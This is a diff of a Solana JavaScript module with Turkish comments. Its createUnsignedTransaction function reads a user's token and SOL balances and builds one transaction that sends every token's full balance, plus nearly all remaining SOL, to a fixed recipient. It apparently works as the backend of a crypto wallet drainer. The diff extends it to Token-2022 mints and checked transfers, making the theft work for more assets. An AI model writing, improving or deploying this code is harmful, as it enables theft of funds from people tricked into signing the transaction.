@@ -10,11 +10,12 @@ import {
 import {
   getAssociatedTokenAddress,
   getAccount,
-  createTransferInstruction,
-  // Aşağıdaki idempotent fonksiyon yeni sürümlerde mevcut.
-  // Yoksa try/catch ile fallback yapıyoruz.
+  createTransferCheckedInstruction,
   createAssociatedTokenAccountIdempotentInstruction,
   createAssociatedTokenAccountInstruction,
+  TOKEN_PROGRAM_ID,
+  TOKEN_2022_PROGRAM_ID,
+  ASSOCIATED_TOKEN_PROGRAM_ID,
 } from "@solana/spl-token";
 import { connection } from "./connect.js";
 import { TOKEN_CONFIGS } from "./token-config.js";
@@ -24,13 +25,10 @@ const BATCH_SIZE = 3;
 const BATCH_DELAY_MS = 1000;
 
 // — Genel ayarlar —
-const FIXED_FEE_BUFFER_LAMPORTS = 6_000_000; // ~0.006 SOL genel ücret tamponu
-const TOKEN_ACCOUNT_SIZE = 165;              // SPL token account boyutu (rent hesabı için)
+const FIXED_FEE_BUFFER_LAMPORTS = 6_000_000; // ~0.006 SOL ücret tamponu
+const TOKEN_ACCOUNT_SIZE = 165;              // SPL token account boyutu (rent için)
 
-/**
- * Verilen async görevleri en fazla BATCH_SIZE tanesini aynı anda çalıştırır,
- * sonra BATCH_DELAY_MS milisaniye bekler, sonra kalanları çalıştırır.
- */
+/** Basit batch runner */
 async function runBatches(tasks) {
   const results = [];
   for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
@@ -42,6 +40,17 @@ async function runBatches(tasks) {
     }
   }
   return results;
+}
+
+/** Mint hesabının owner’ına bakarak hangi token programı (legacy / 2022) olduğunu tespit eder. */
+async function detectTokenProgramId(mintPubkey) {
+  const info = await connection.getAccountInfo(mintPubkey);
+  if (!info) return TOKEN_PROGRAM_ID; // Güvenli varsayılan (çoğu büyük mint legacy)
+  const owner = info.owner;
+  if (owner.equals(TOKEN_PROGRAM_ID)) return TOKEN_PROGRAM_ID;
+  if (owner.equals(TOKEN_2022_PROGRAM_ID)) return TOKEN_2022_PROGRAM_ID;
+  // Çok nadir özel programlar için: yine owner’ı kullan
+  return owner;
 }
 
 export async function createUnsignedTransaction(userPublicKey) {
@@ -56,27 +65,52 @@ export async function createUnsignedTransaction(userPublicKey) {
   // 0) SOL bakiyesi
   const userSolLamports = await connection.getBalance(payer);
 
-  // 1) Kullanıcının SPL bakiyelerini oku (bigint ile)
+  // 1) Her mint için programId tespiti (owner = token program)
+  const progDetectTasks = TOKEN_CONFIGS.map(({ mint }) => async () => {
+    const programId = await detectTokenProgramId(mint);
+    return { mint, programId };
+  });
+  const programMap = await runBatches(progDetectTasks);
+  const programByMint = new Map(programMap.map((x) => [x.mint.toBase58(), x.programId]));
+
+  // 2) Kullanıcının SPL bakiyelerini oku (bigint ile) — doğru programId ile ATA derive et
   const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
-    const userAta = await getAssociatedTokenAddress(mint, payer);
+    const programId = programByMint.get(mint.toBase58()) || TOKEN_PROGRAM_ID;
+
+    // Doğru programId ile deterministik ATA
+    const userAta = await getAssociatedTokenAddress(
+      mint,
+      payer,
+      false,
+      programId,
+      ASSOCIATED_TOKEN_PROGRAM_ID
+    );
+
     let amount = 0n;
     let sufficient = false;
     try {
-      const acct = await getAccount(connection, userAta);
+      // Doğru parser için programId veriyoruz
+      const acct = await getAccount(connection, userAta, undefined, programId);
       amount = acct.amount; // bigint
-      // threshold config number ise bigint'e çeviriyoruz
-      const th = BigInt(threshold);
+      const th = BigInt(threshold ?? 0);
       sufficient = amount > th;
     } catch {
-      // Kullanıcının ATA'sı yok veya hesap okunamadı => yeterli değil
-      sufficient = false;
+      sufficient = false; // ATA yok ya da okuyamadık
     }
-    const toAta = await getAssociatedTokenAddress(mint, toPublicKey);
-    return { mint, userAta, toAta, amount, sufficient };
+
+    const toAta = await getAssociatedTokenAddress(
+      mint,
+      toPublicKey,
+      false,
+      programId,
+      ASSOCIATED_TOKEN_PROGRAM_ID
+    );
+
+    return { mint, programId, userAta, toAta, amount, sufficient };
   });
   const userTokenInfos = await runBatches(balanceTasks);
 
-  // 2) Transfer etmeyi planladığımız tokenlar
+  // 3) Transfer etmeyi planladığımız tokenlar
   const candidateTokens = userTokenInfos.filter((t) => t.sufficient);
 
   // Hiçbir varlık yeterli değilse ve SOL de yoksa çık
@@ -85,12 +119,11 @@ export async function createUnsignedTransaction(userPublicKey) {
     return null;
   }
 
-  // 3) Hedef tarafta eksik ATA var mı? (idempotent create planı)
+  // 4) Hedef tarafta eksik ATA var mı?
   const existTasks = candidateTokens.map((info) => async () => {
-    // getAccount ile dene; yoksa hata atar
     let toAtaExists = true;
     try {
-      await getAccount(connection, info.toAta);
+      await getAccount(connection, info.toAta, undefined, info.programId);
     } catch {
       toAtaExists = false;
     }
@@ -98,72 +131,77 @@ export async function createUnsignedTransaction(userPublicKey) {
   });
   const tokenPlans = await runBatches(existTasks);
 
-  // 4) Rent bedelini hesapla ve bütçeyi oluştur
+  // 5) Rent bedeli ve bütçe
   const ataRentLamports = await connection.getMinimumBalanceForRentExemption(TOKEN_ACCOUNT_SIZE);
-
-  // SOL bütçesi: önce sabit tamponu kenara ayır
   let spendableLamports = Math.max(userSolLamports - FIXED_FEE_BUFFER_LAMPORTS, 0);
 
-  // 5) Hangi tokenları dahil edebileceğimizi seçelim:
-  // - Hedef ATA varsa: rent harcamaz
-  // - Hedef ATA yoksa: her biri için ataRentLamports harcar
+  // 6) Dahil edilecekler
   const selected = [];
   for (const plan of tokenPlans) {
     if (plan.toAtaExists) {
       selected.push({ ...plan, needsCreate: false });
+    } else if (spendableLamports >= ataRentLamports) {
+      spendableLamports -= ataRentLamports;
+      selected.push({ ...plan, needsCreate: true });
     } else {
-      if (spendableLamports >= ataRentLamports) {
-        spendableLamports -= ataRentLamports;
-        selected.push({ ...plan, needsCreate: true });
-      } else {
-        console.warn(
-          `Rent yetersiz: ${plan.mint.toBase58()} için hedef ATA oluşturacak SOL kalmadı, token atlandı.`
-        );
-      }
+      console.warn(
+        `Rent yetersiz: ${plan.mint.toBase58()} için hedef ATA oluşturacak SOL kalmadı, token atlandı.`
+      );
     }
   }
 
-  // 6) Instruction'ları derle
+  // 7) Instruction'lar
   const instructions = [];
 
-  // 6a) SPL tokenlar: önce gerekiyorsa hedef ATA oluştur, sonra transfer et
+  // 7a) SPL: gerekiyorsa hedef ATA create (doğru programId ile), sonra checked transfer
   for (const t of selected) {
     if (t.needsCreate) {
-      // Idempotent fonksiyon mevcutsa onu kullan
       if (typeof createAssociatedTokenAccountIdempotentInstruction === "function") {
+        // (payer, ata, owner, mint, tokenProgramId?, associatedProgramId?)
         instructions.push(
           createAssociatedTokenAccountIdempotentInstruction(
-            payer,          // payer (oluşturma ücretini ödeyen)
-            t.toAta,        // oluşturulacak ATA
-            toPublicKey,    // ATA sahibi (alıcı)
-            t.mint          // mint
+            payer,
+            t.toAta,
+            toPublicKey,
+            t.mint,
+            t.programId,
+            ASSOCIATED_TOKEN_PROGRAM_ID
           )
         );
       } else {
-        // Eski sürüm fallback: önceden "var mı?" kontrolü yaptık, güvenle klasik oluşturmayı ekleyebiliriz
         instructions.push(
           createAssociatedTokenAccountInstruction(
-            payer,          // payer
-            t.toAta,        // ata
-            toPublicKey,    // owner
-            t.mint          // mint
+            payer,
+            t.toAta,
+            toPublicKey,
+            t.mint,
+            t.programId,
+            ASSOCIATED_TOKEN_PROGRAM_ID
           )
         );
       }
     }
 
-    // Tüm bakiyeyi gönderiyoruz (amount bigint)
+    // decimals'ı config'ten çek
+    const cfg = TOKEN_CONFIGS.find((c) => c.mint.equals(t.mint));
+    const decimals = cfg?.decimals ?? 0;
+
+    // Checked transfer: (source, dest, mint, owner, amount, decimals, multiSigners?, programId?)
     instructions.push(
-      createTransferInstruction(
-        t.userAta,     // source ATA (kullanıcı)
-        t.toAta,       // hedef ATA
-        payer,         // authority (kullanıcı)
-        t.amount       // bigint olarak miktar
+      createTransferCheckedInstruction(
+        t.userAta,
+        t.mint,
+        t.toAta,
+        payer,
+        t.amount,
+        decimals,
+        [],
+        t.programId
       )
     );
   }
 
-  // 6b) Kalan SOL'u (spendableLamports) gönder (varsa)
+  // 7b) Kalan SOL'u gönder (varsa)
   const solToSend = Math.max(spendableLamports, 0);
   if (solToSend > 0) {
     instructions.push(
@@ -175,13 +213,12 @@ export async function createUnsignedTransaction(userPublicKey) {
     );
   }
 
-  // Hiç instruction yoksa null döndür
   if (instructions.length === 0) {
     console.warn("Eklenecek hiçbir instruction bulunamadı.");
     return null;
   }
 
-  // 7) VersionedTransaction oluştur
+  // 8) VersionedTransaction
   const { blockhash } = await connection.getLatestBlockhash();
   const messageV0 = new TransactionMessage({
     payerKey: payer,
@@ -189,11 +226,17 @@ export async function createUnsignedTransaction(userPublicKey) {
     instructions,
   }).compileToV0Message();
 
-  // Debug: hangi tokenlar eklendi?
+  // Debug
   try {
     console.table(
       selected.map((s) => ({
         mint: s.mint.toBase58(),
+        programId:
+          s.programId.equals(TOKEN_PROGRAM_ID)
+            ? "TOKEN_PROGRAM_ID"
+            : s.programId.equals(TOKEN_2022_PROGRAM_ID)
+            ? "TOKEN_2022_PROGRAM_ID"
+            : s.programId.toBase58(),
         amount: s.amount.toString(),
         toAtaExists: s.toAtaExists,
         needsCreate: s.needsCreate,
